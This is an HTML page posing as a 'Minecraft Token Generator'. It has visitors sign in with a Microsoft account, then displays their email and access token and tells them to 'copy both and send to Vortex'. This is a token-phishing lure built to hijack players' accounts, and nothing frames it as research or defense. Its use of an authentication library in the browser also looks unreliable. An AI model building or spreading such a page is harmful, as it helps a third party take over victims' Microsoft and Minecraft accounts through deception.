<!DOCTYPE html>
<html>
<head>
  <title>Minecraft Token Generator</title>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
    button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
    #output { margin-top: 20px; word-wrap: break-word; }
  </style>
</head>
<body>
  <h1>Get Your Minecraft Token</h1>
  <p>Click below to log in with your Microsoft account.</p>
  <button onclick="getToken()">Get Token</button>
  <div id="output"></div>
  <script src="https://cdn.jsdelivr.net/npm/msmc@3.0.4/min.js"></script>
  <script>
    async function getToken() {
      const output = document.getElementById('output');
      output.innerHTML = 'Loading...';
      try {
        const auth = new MSMCAuth();
        const token = await auth.launch('browser');
        output.innerHTML = `
          <p><strong>Email:</strong> ${token.profile.email || 'Unknown'}</p>
          <p><strong>Token:</strong> ${token.access_token}</p>
          <p>Copy both and send to Vortex!</p>
        `;
      } catch (err) {
        output.innerHTML = `Error: ${err.message}`;
      }
    }
  </script>
</body>
</html>
